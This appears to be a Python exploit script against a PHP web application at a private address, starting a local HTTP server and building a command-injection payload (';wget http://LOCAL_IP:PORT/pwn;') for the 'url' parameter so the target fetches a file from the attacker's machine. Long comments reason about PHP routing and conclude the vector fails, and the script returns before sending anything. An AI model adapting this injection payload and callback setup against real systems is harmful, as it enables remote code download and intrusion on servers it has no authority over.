import requests
import http.server
import socketserver
import threading
import time
import os

TARGET_IP = "192.168.1.173"
LOCAL_IP = "192.168.1.11"
PORT = 8000

# checkupdate.php takes 'url' parameter.
# We try to inject command into it.
# Payload: http://TARGET/api/index.php?url=checkupdate&url=;wget http://LOCAL:PORT/pwn;

def start_server():
    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"[+] Request received: {self.path}")
            super().do_GET()
    
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Server listening on port {PORT}")
        httpd.timeout = 10
        start_time = time.time()
        while time.time() - start_time < 20:
            httpd.handle_request()

def exploit():
    # Start server in background
    t = threading.Thread(target=start_server)
    t.start()
    
    time.sleep(1)
    
    payload_url = f";wget http://{LOCAL_IP}:{PORT}/pwn;"
    target = f"http://{TARGET_IP}/api/index.php"
    params = {
        'url': 'checkupdate', # routing
        'url': payload_url    # payload? No, dict keys unique.
    }
    # Requests dict key overwrite?
    # We need to construct query string manually if duplicate keys needed.
    # But index.php uses $_GET['url'].
    # If we send url=checkupdate&url=payload.
    # PHP sets $_GET['url'] to the LAST value.
    # So routing fails?
    # index.php: $url = $_GET['url']; include($url . ".php");
    # If $url is payload, include fails.
    
    # So we need index.php to use one value, and checkupdate.php to use another?
    # Impossible with standard $_GET.
    
    # UNLESS index.php uses $_REQUEST['url'] and checkupdate uses $_GET['url']?
    # Or index.php parses URL path?
    # The URL structure is /api/index.php?url=...
    
    # Maybe checkupdate.php uses DIFFERENT parameter name?
    # In the dump: $url = $_GET['url'];
    # So it uses the same parameter name as routing!
    # This implies checkupdate.php cannot work if accessed via index.php routing?
    # Unless index.php includes checkupdate.php based on some other logic?
    # No, index.php usually does `include $_GET['url']`.
    
    # So, if I send url=checkupdate;wget...
    # index.php tries to include "checkupdate;wget....php".
    # File not found.
    
    # Conclusion: checkupdate.php is broken or unreachable via index.php routing if it relies on 'url' parameter for its logic.
    # OR, it is designed to be called directly?
    # /www/inc/checkupdate.php? Not in web root.
    # Web root is /www/html/.
    # /www/inc is outside.
    
    # So checkupdate.php is only includable.
    # And if it uses the same variable name as routing, it conflicts.
    # Maybe it uses $argv?
    # "if(isset($argv))" - seen in update.php.
    # checkupdate.php?
    
    print("[-] Logic analysis suggests checkupdate.php is not exploitable via url parameter due to routing conflict.")
    return

if __name__ == "__main__":
    exploit()
